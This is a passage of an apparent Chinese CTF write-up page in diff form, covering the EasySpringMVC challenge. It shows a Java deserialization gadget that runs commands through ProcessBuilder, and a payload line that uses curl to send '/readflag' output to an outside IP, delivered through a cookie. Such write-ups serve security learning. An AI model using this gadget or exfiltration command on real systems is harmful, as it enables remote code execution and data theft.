class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="comment">//String[] cmd=&#123;"/bin/sh", "-c","curl -d `/readflag` 174.0.219.93:8888"&#125;;</span></span><br><span class="line">        String[] cmd=&#123;<span class="string">"calc"</span>&#125;;</span><br><span class="line">        out.writeObject(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/29/V/image-20200301120719913.png" alt="image-20200301120719913"></p>
+<p>将运行后的base64，放入test.java中测试一下</p>
+<p><img src="/2020/02/29/V/image-20200301120834520.png" alt="image-20200301120834520"></p>
+<p>之后就可以执行命令了，<a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">这里参考一下师傅的文章</a>，里面讲解了Runtime.getRuntime().exec(cmd)和ProcessBuilder pb=new ProcessBuilder(cmd)的区别和用法，</p>
+<p>然后我们把命令改下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">      String[] cmd=&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>,<span class="string">"curl -d `/readflag` 174.0.219.93:8888"</span>&#125;;</span><br><span class="line">      <span class="comment">//String[] cmd=&#123;"calc"&#125;;</span></span><br><span class="line">      out.writeObject(cmd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成的替换下cookie,就得到了 flag</p>
+<p><img src="/2020/02/29/V/image-20200301122930606.png" alt="image-20200301122930606"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+    <div class="social-list">
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+                <span class="label">RSS</span>
+              </a>
+            </div>
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="https://www.jianshu.com/u/9c3ca1ca4784">
+                <span class="icon">
+                  <i class="fa fa-heartbeat"></i>
+                </span>
+                <span class="label">简书</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HappyCTFd"><span class="nav-number">1.</span> <span class="nav-text">HappyCTFd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CHECKIN"><span class="nav-number">2.</span> <span class="nav-text">CHECKIN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TimeTravel"><span class="nav-number">3.</span> <span class="nav-text">TimeTravel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EasySpringMVC"><span class="nav-number">4.</span> <span class="nav-text">EasySpringMVC</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="BOITeam"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">BOITeam</p>
+  <div class="site-description" itemprop="description">潜心专研、与世无争😄</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Cyc1eC" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Cyc1eC" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/9c3ca1ca4784" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;9c3ca1ca4784" rel="noopener" target="_blank"><i class="fa fa-fw fa-heartbeat"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+      <!--<script src="https://cdn.staticfile.org/jquery/3.1.1/jquery.min.js"></script>
+<script>
+    var div = $('.post-body');
+    var toc=$('.post-toc')
+    function password() {
+        if(''){
+            div.remove();
+            toc.remove();
+            $('.post-header').after(
+            '<span class="description" value="password" style="font-style: normal;font-weight: bold;border: none;display: block;'+
+            'width: 60%;margin: 0 auto;text-align: center;outline: none;margin-bottom: 40px;resize:none ">'+
+            'Private Articles' +
+            '</span>' +
+            '<div class="qiang" style="height: 100px;width: 60%;margin:0 auto">' +
+            '<input class="password"  type="password" autocomplete="new-password" autofocus="autofocus" value="" style="border-radius: 5px;height: 30px;border: none;display: block;border-bottom: 1px solid #ccc;' +
+            'margin: 0 auto;outline: none;width:95%"/>' +
+            '</div>')
+            //绑定点击事件，如果是点击的.password 这个div就改变样式，如果是document中除了div之外的其他任何元素，就变回原来的样式。
+            document.onclick = function (event) {
+                var e = event || window.event;
+                var elem = e.srcElement || e.target;
+
+                while (elem) {
+                    if (elem != document) {
+                        if (elem.className == "password") {
+                            //$(".password").animate({paddingTop:"30px",width:"100%",borderWidth:"2px"},300)
+                            return;
+                        }
+                        elem = elem.parentNode;
+                    } else {
+                        //$(".password").animate({paddingTop:"0px",width:"95%",borderWidth:"1px"},300)
+                        return;
+                    }
+                }
+            }
+
+            $(document).keyup(function(event){
+                if(event.keyCode ==13&&$('.password').length>0){
+                    //console.log($('.password').val())
+                    //console.log('')
+                    if ($('.password').val() == '') {
+                        //恢复文章内容
+                        (div).appendTo($(".post-header"))
+                        //恢复目录
+                        toc.appendTo($(".sidebar-inner"))
+                        //删除本页面的输入密码组件
+                        $(".description").remove();
+                        $(".qiang").remove();
+                        $(".password").remove();
+
+                        $('img').lazyload({
+                            placeholder: '/images/loading.gif',
+                            effect: 'fadeIn',
+                            threshold : 100,
+                            failure_limit : 20,
+                            skip_invisible : false
+                        });
+                        $(".post-block").css({opacity:1});
+                        $(".post-header").css({opacity:1});
+                        $(".post-body").css({opacity:1});
+                        $(".pagination").css({opacity:1});
+                    }else {
+                        alert("Error Password")
+                    }
+                }
+            });
+        }
+    }
+    password();
+</script>-->
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BOITeam</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">6k</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
